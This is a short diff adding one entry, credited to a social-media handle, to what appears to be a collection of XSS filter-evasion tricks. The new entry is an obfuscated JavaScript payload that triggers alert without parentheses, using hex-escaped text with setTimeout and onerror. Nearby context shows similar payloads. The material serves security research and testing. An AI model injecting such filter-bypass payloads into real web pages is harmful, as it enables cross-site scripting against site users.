@@ -224,6 +224,15 @@ location = /javascript:/.source + alert.name+x+23+x
 
 ---
 
+
+[kabilan1290](https://x.com/kabilan1290)
+
+
+    onerror=alert;setTimeout`\x74\x68\x72\x6F\x77 23`
+    
+
+---
+
 [aemkei](https://twitter.com/aemkei)
 
     onhashchange=setTimeout;
